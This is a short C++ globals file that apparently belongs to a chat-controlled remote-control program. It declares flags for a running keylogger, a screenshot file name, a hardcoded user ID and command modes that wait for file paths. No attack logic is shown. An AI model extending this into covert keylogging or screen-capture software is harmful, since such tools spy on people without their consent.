#include "globals.h"

const char* filename = "temp.txt";
const char* scrname = "scr.bmp";
bool isKeyLoggerRunning = false;
bool isConversationRunning = false;
const int64_t sashaId = 1041837892;

/*
If the current mode is empty, it means that this is a normal mode:
we can write commands, but if it is not empty, it means that
the program will not accept commands, but will accept what
the mode is set to (path to folder, flags for executing subtasks, etc.)
*/

int currentMode = MODE_STANDARD;
std::string conversationMode = "speak";
bool isWaitingForSecondPath = false;
bool isWaitingForFile = false;